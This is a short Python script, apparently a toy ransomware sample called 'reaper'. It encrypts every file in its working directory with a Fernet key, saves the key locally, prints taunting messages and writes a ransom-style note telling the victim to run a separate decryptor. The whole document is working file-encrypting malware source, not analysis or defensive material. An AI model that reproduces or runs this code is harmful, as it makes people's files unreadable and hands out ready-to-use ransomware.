#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file=="reaper.py" or file == "key.key" or file=="reaperdecryptor.py" or file =="FILESENCRYPTED.txt":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted  = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print (" All your files are encrypted! Luckily we have a decoder! ;)")
print (" Find and run reaperdecryptor.py in the command terminal to get your files back!")


notice = ("echo 'Your files are encrypted! Run our magical decryptor to get them back!' > FILESENCRYPTED.txt")
os.system(notice)
